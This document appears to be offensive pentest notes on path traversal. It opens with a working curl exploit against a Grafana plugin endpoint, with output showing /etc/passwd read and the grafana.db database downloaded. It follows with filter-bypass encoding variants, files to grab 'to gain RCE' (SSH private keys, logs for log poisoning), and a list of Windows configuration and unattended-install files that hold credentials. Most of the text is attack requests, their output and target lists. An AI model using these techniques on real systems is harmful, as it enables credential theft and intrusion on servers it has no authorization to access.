
## Syntax

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```

Saving into file locally.

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  748k  100  748k    0     0  1364k      0 --:--:-- --:--:-- --:--:-- 1362k
```

**Practical manual techniques to try**

- **Simple traversal:** start with `../../../../etc/passwd` — but don’t stop there.
- **Try variants like :** `..//..//..//etc/passwd` or `..\/..\/..\/etc/passwd.`
- **Dot+slash permutations:** `..././../` or `..%2f..%2f..%2fetc/passwd` (URL encoded).
- **Try Double-encoding:** URL-encode twice if the app decodes input more than once (example: `%252e%252e%252f` = `%2e%2e%2f`).

Things u need to check to gain RCE

```
/etc/passwd
/.ssh/id_rsa
/var/log/apache2/access.log # for log poisoning RCE
```

---
## Windows

## Paths to check

Hosts File

```
C:\Windows\System32\drivers\etc\hosts
```


Network Interfaces / Routing

```
C:\Windows\System32\drivers\etc\networks
```

System Version & Build Info:

```
C:\Windows\System32\license.rtf
C:\Windows\System32\eula.txt
```

Unattended Installation Files: (May contain setup configurations or administrator credentials from OS setup)

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep.inf
```

##### Web Server Configuration & Log Files

###### IIS (Internet Information Services)

Application Host Config

```
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\System32\inetsrv\config\schema\NetFX40_Server_Schema.xml
```

Web Root Configurations

```
C:\inetpub\wwwroot\web.config
```

IIS Logs (Format: u_exYYMMDD.log in dated subfolders)

```
C:\inetpub\logs\LogFiles\W3SVC1\u_ex240101.log
```
###### Apache on Windows (XAMPP / WampServer)

Configuration

```
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\conf\extra\httpd-vhosts.conf
C:\wamp\bin\apache\apacheX.X.X\conf\httpd.conf
```

Logs

```
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

Nginx on Windows

Configuration

```
C:\nginx\conf\nginx.conf
```

Logs

```
C:\nginx\logs\access.log
C:\nginx\logs\error.log
```

##### Database & Application Configurations

Application configuration files often contain database connection strings, API keys, or application settings:

PHP Settings

```
C:\php\php.ini
C:\Windows\php.ini
C:\xampp\php\php.ini
```

MySQL / MariaDB

```
C:\xampp\mysql\bin\my.ini
C:\ProgramData\MySQL\MySQL Server X.X\my.ini
```

ASP.NET Applications

```
C:\inetpub\wwwroot\web.config
```
